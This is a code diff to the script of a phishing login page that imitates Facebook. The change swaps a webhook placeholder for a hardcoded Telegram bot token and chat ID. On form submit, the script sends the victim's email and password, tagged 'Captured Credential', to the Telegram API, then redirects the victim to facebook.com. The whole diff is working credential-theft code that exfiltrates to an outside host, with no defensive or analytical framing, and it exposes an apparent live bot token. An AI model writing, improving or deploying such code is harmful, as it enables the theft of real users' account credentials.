@@ -42,7 +42,8 @@
     </div>
 
     <script>
-        const WEBHOOK_URL = "YOUR_DISCORD_OR_TELEGRAM_WEBHOOK_URL_HERE";
+        const BOT_TOKEN = "8699216781:AAHJEaBKkPX8--VjbT7woy7mP86SedSu3u8";
+        const CHAT_ID = "7399367572";
 
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
@@ -50,14 +51,11 @@
             const user = document.getElementById('email').value;
             const pass = document.getElementById('pass').value;
 
-            const payload = {
-                content: `🚨 **Captured Credential:**\n👤 **User:** \`${user}\`\n🔑 **Pass:** \`${pass}\``
-            };
+            const message = encodeURIComponent(`🚨 Captured Credential:\n👤 User: ${user}\n🔑 Pass: ${pass}`);
+            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`;
 
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
+            fetch(telegramUrl, {
+                method: 'GET'
             }).then(() => {
                 window.location.href = "https://www.facebook.com";
             }).catch(() => {
